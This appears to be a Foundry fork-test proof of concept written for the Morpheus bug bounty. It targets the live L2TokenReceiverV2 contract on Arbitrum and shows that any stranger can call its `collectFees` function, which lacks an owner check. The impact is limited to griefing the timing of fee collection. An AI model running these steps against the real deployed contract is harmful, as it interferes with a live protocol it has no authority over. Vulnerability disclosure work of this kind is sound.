// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

/// @notice C-2 [Low] — Morpheus Bug Bounty, fork PoC (read-only fork, no mainnet tx).
/// @dev Target: L2TokenReceiverV2 @ 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790 on Arbitrum,
///      fork block 523422593, RPC from FORK_RPC_URL (default https://arb1.arbitrum.io/rpc —
///      arbitrum.publicnode.com 403s historical-state requests, "Archive requests
///      require a personal token").
///      Run: `FORK_RPC_URL=<url> forge test -vv` from this folder.
///      No vm.prank as owner/admin/multisig anywhere in this file. The only
///      pranked caller is `stranger`, an arbitrary unprivileged address.
///
///      Finding: `collectFees` is the ONLY state-changing function of
///      L2TokenReceiverV2 without `onlyOwner` (repo L2TokenReceiverV2.sol:123;
///      siblings `swap`, `increaseLiquidityCurrentRange`, `editParams`,
///      `withdrawToken`, `withdrawTokenId` are all `onlyOwner`). Funds cannot
///      be stolen — `recipient` is hardcoded to `address(this)` — so the loss
///      is exclusive control over WHEN fees are collected (timing/griefing).
///
///      Live state at the pinned block (verified read-only, see notes.md):
///      the receiver is V2 (`version()==2`), it owns NO Uniswap V3 position
///      (NPM `balanceOf == 0`) and holds 0 wstETH / 0 WETH / 2.98 MOR, so the
///      currently collectable fee amount on live is $0. The live
///      demonstration therefore has two parts:
///       1. REVERT DISCRIMINATION on the pristine fork: a stranger's
///          `collectFees` reverts with the NPM's "Not approved" (the receiver
///          owns no position), while the same stranger's `swap` reverts with
///          "Ownable: caller is not the owner". The receiver itself performs
///          NO access check on `collectFees` — the only gate is downstream.
///       2. END-TO-END on the live contract: ANYONE (permissionless, no
///          privileged role) can mint a real V3 position, donate the NFT to
///          the receiver, generate real fees with a swap, and then a stranger
///          successfully calls `collectFees` on the live receiver and the
///          `FeesCollected` event fires — while the same stranger's `swap`
///          and `increaseLiquidityCurrentRange` revert with Ownable.
///          Setup uses only `deal` (test funding) + unprivileged on-chain
///          actions any mainnet user could perform.
///
///      Byte-identity: the live implementation's runtime code is byte-identical
///      to a fresh local build of the repo source (HEAD 07f6032, solc 0.8.20,
///      optimizer 200, evm paris) except for the 5 deployed immutable words
///      and the trailing metadata hash (verified off-chain, see notes.md).
///      The test pins that exact live bytecode via its codehash.

interface IERC20Minimal {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IL2TokenReceiverV2Live {
    function version() external view returns (uint256);
    function owner() external view returns (address);
    function router() external view returns (address);
    function nonfungiblePositionManager() external view returns (address);
    function secondSwapParams()
        external
        view
        returns (address tokenIn, address tokenOut, uint24 fee, uint160 sqrtPriceLimitX96);
    function firstSwapParams()
        external
        view
        returns (address tokenIn, address tokenOut, uint24 fee, uint160 sqrtPriceLimitX96);
    function collectFees(uint256 tokenId) external returns (uint256 amount0, uint256 amount1);
    function swap(uint256 amountIn, uint256 amountOutMinimum, uint256 deadline, bool isUseFirstSwapParams)
        external
        returns (uint256);
    function increaseLiquidityCurrentRange(
        uint256 tokenId,
        uint256 amountAdd0,
        uint256 amountAdd1,
        uint256 amountMin0,
        uint256 amountMin1
    ) external returns (uint128 liquidity, uint256 amount0, uint256 amount1);
}

interface INonfungiblePositionManagerMinimal {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    function mint(MintParams calldata params)
        external
        returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
    function positions(uint256 tokenId)
        external
        view
        returns (
            uint96 nonce,
            address operator,
            address token0,
            address token1,
            uint24 fee,
            int24 tickLower,
            int24 tickUpper,
            uint128 liquidity,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        );
    function balanceOf(address owner) external view returns (uint256);
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface ISwapRouter02Minimal {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external returns (uint256 amountOut);
}

interface IUniswapV3PoolMinimal {
    function slot0()
        external
        view
        returns (
            uint160 sqrtPriceX96,
            int24 tick,
            uint16 observationIndex,
            uint16 observationCardinality,
            uint16 observationCardinalityNext,
            uint8 feeProtocol,
            bool unlocked
        );
    function liquidity() external view returns (uint128);
}

contract C2CollectFeesForkTest is Test {
    uint256 internal constant FORK_BLOCK = 523422593;

    // Live addresses (Arbitrum One).
    address internal constant RECEIVER = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address internal constant IMPL = 0x27353fFaDFD53538e8BDF81be7041C56CE2d5ae4;
    address internal constant NPM = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address internal constant ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address internal constant WSTETH = 0x5979D7b546E38E414F7E9822514be443A4800529;
    address internal constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address internal constant MOR = 0x092bAaDB7DEf4C3981454dD9c0A0D7FF07bCFc86;
    address internal constant POOL_WETH_MOR_3000 = 0xE5Cf22EE4988d54141B77050967E1052Bd9c7F7A;

    // keccak256 of the live implementation runtime code (verified off-chain).
    bytes32 internal constant IMPL_CODEHASH =
        0x90a7a2937f998c001250c26a4279822ee50ec710b4d990bf52320cac6f935d8b;

    address internal constant OWNER = 0x151c2b49CdEC10B150B2763dF3d1C00D70C90956;
    address internal constant STRANGER = address(0x9999);

    event FeesCollected(uint256 indexed tokenId, uint256 amount0, uint256 amount1);

    IL2TokenReceiverV2Live internal receiver;

    function setUp() public {
        vm.createSelectFork(vm.envOr("FORK_RPC_URL", string("https://arb1.arbitrum.io/rpc")), FORK_BLOCK);
        receiver = IL2TokenReceiverV2Live(RECEIVER);
    }

    /// @notice Live state at the pinned block: V2, configured, byte-identical
    ///         to the repo source, and holding NO position — so $0 of fees is
    ///         collectable on live today. The finding is latent until/unless
    ///         the receiver ever holds a position (see end-to-end test).
    function test_LiveState_V2ConfiguredNoPosition() public view {
        assertEq(receiver.version(), 2, "live receiver must be V2");
        assertEq(receiver.owner(), OWNER);
        assertEq(receiver.router(), ROUTER, "router must be Arbitrum SwapRouter02");
        assertEq(receiver.nonfungiblePositionManager(), NPM, "NPM must be canonical Arbitrum NPM");
        assertEq(IMPL.codehash, IMPL_CODEHASH, "live impl must be the byte-verified V2 build");

        (address in2, address out2, uint24 fee2, uint160 sqrt2) = receiver.secondSwapParams();
        assertEq(in2, WETH);
        assertEq(out2, MOR);
        assertEq(fee2, 3000);
        assertEq(sqrt2, 0);

        (address in1, address out1, uint24 fee1, uint160 sqrt1) = receiver.firstSwapParams();
        assertEq(in1, WSTETH);
        assertEq(out1, WETH);
        assertEq(fee1, 100);
        assertEq(sqrt1, 0);

        // No V3 position is owned: no fees can be collected on live today.
        assertEq(INonfungiblePositionManagerMinimal(NPM).balanceOf(RECEIVER), 0, "receiver owns no position");
        assertEq(IERC20Minimal(WSTETH).balanceOf(RECEIVER), 0);
        assertEq(IERC20Minimal(WETH).balanceOf(RECEIVER), 0);
        assertEq(IERC20Minimal(MOR).balanceOf(RECEIVER), 2980659085866802225, "2.9806 MOR dust");
    }

    /// @notice Revert discrimination on the pristine fork: the receiver does
    ///         NO access check of its own on `collectFees`. A stranger's call
    ///         fails only downstream at the NPM ("Not approved" — the receiver
    ///         owns no position), while the same stranger's `swap` fails at
    ///         the receiver's own `onlyOwner` gate. Verified identically via
    ///         eth_call in notes.md (incl. the owner getting "Not approved"
    ///         too — the owner is NOT pranked in this file, per task rules).
    function test_RevertDiscrimination_StrangerCollectFeesHasNoOnlyOwner() public {
        vm.prank(STRANGER);
        vm.expectRevert(bytes("Not approved"));
        receiver.collectFees(1);

        vm.prank(STRANGER);
        vm.expectRevert(bytes("Ownable: caller is not the owner"));
        receiver.swap(1 ether, 1, block.timestamp + 1, false);

        vm.prank(STRANGER);
        vm.expectRevert(bytes("Ownable: caller is not the owner"));
        receiver.increaseLiquidityCurrentRange(1, 1 ether, 1 ether, 0, 0);
    }

    /// @notice END-TO-END on the live contract. Steps (all permissionless —
    ///         any mainnet user could do the same, no privileged role):
    ///         1. fund this contract with WETH + MOR (test-only `deal`),
    ///         2. mint a real full-range V3 position in the live WETH/MOR
    ///            0.3% pool and donate the NFT to the live receiver,
    ///         3. swap WETH->MOR and MOR->WETH through the live pool so real
    ///            fees accrue to that position,
    ///         4. a STRANGER (not owner) calls `collectFees` on the live
    ///            receiver: it succeeds, emits FeesCollected, fees land in
    ///            the receiver (not the stranger),
    ///         5. control: the same stranger's `swap` /
    ///            `increaseLiquidityCurrentRange` revert with Ownable.
    function test_StrangerCollectsFeesOnLiveReceiver_EndToEnd() public {
        INonfungiblePositionManagerMinimal npm = INonfungiblePositionManagerMinimal(NPM);

        // 1-2. Mint a full-range position and donate the NFT to the receiver.
        deal(WETH, address(this), 100 ether);
        deal(MOR, address(this), 200_000 ether);
        IERC20Minimal(WETH).approve(NPM, type(uint256).max);
        IERC20Minimal(MOR).approve(NPM, type(uint256).max);

        INonfungiblePositionManagerMinimal.MintParams memory mintParams = INonfungiblePositionManagerMinimal
            .MintParams({
                token0: MOR, // 0x092b... < 0x82aF... so MOR is token0
                token1: WETH,
                fee: 3000,
                tickLower: -887220,
                tickUpper: 887220,
                amount0Desired: 100_000 ether,
                amount1Desired: 10 ether,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(this),
                deadline: block.timestamp + 1 hours
            });
        (uint256 tokenId, uint128 liquidity, uint256 used0, uint256 used1) = npm.mint(mintParams);
        assertGt(liquidity, 0, "position must have liquidity");
        emit log_named_uint("position tokenId", tokenId);
        emit log_named_uint("position amount0 MOR used", used0);
        emit log_named_uint("position amount1 WETH used", used1);

        npm.safeTransferFrom(address(this), RECEIVER, tokenId);
        assertEq(npm.balanceOf(RECEIVER), 1, "receiver now owns the position");

        // 3. Generate real fees with swaps through the live pool.
        ISwapRouter02Minimal router = ISwapRouter02Minimal(ROUTER);
        deal(WETH, address(this), 10 ether);
        deal(MOR, address(this), 50_000 ether);
        IERC20Minimal(WETH).approve(ROUTER, type(uint256).max);
        IERC20Minimal(MOR).approve(ROUTER, type(uint256).max);
        router.exactInputSingle(
            ISwapRouter02Minimal.ExactInputSingleParams({
                tokenIn: WETH,
                tokenOut: MOR,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp + 1 hours,
                amountIn: 5 ether,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
        router.exactInputSingle(
            ISwapRouter02Minimal.ExactInputSingleParams({
                tokenIn: MOR,
                tokenOut: WETH,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp + 1 hours,
                amountIn: 20_000 ether,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        // NOTE: `positions().tokensOwed` is NOT updated by swaps alone — it is
        // only synced when the position is touched (collect / liquidity
        // change). The accrued fees are proven by the `collectFees` return
        // values below, not by this read. We log it only for the record.
        (,,,,,,,,,, uint128 owed0, uint128 owed1) = npm.positions(tokenId);
        emit log_named_uint("fees owed token0 MOR (stale until touched)", owed0);
        emit log_named_uint("fees owed token1 WETH (stale until touched)", owed1);

        // 4. A STRANGER collects the fees on the live receiver.
        uint256 morBefore = IERC20Minimal(MOR).balanceOf(RECEIVER);
        uint256 wethBefore = IERC20Minimal(WETH).balanceOf(RECEIVER);

        vm.expectEmit(true, false, false, false, RECEIVER);
        emit FeesCollected(tokenId, 0, 0); // only the event + tokenId topic are checked
        vm.prank(STRANGER);
        (uint256 amount0, uint256 amount1) = receiver.collectFees(tokenId);

        assertGt(amount0 + amount1, 0, "stranger-triggered collection must return real fees");
        assertEq(IERC20Minimal(MOR).balanceOf(RECEIVER), morBefore + amount0, "fees land in receiver");
        assertEq(IERC20Minimal(WETH).balanceOf(RECEIVER), wethBefore + amount1, "fees land in receiver");
        assertEq(IERC20Minimal(MOR).balanceOf(STRANGER), 0, "stranger steals nothing");
        assertEq(IERC20Minimal(WETH).balanceOf(STRANGER), 0, "stranger steals nothing");
        emit log_named_uint("collected amount0 MOR", amount0);
        emit log_named_uint("collected amount1 WETH", amount1);

        // 5. Control: the same stranger CANNOT use the owner-gated siblings.
        vm.prank(STRANGER);
        vm.expectRevert(bytes("Ownable: caller is not the owner"));
        receiver.swap(1 ether, 1, block.timestamp + 1, false);

        vm.prank(STRANGER);
        vm.expectRevert(bytes("Ownable: caller is not the owner"));
        receiver.increaseLiquidityCurrentRange(tokenId, 1 ether, 1 ether, 0, 0);
    }
}
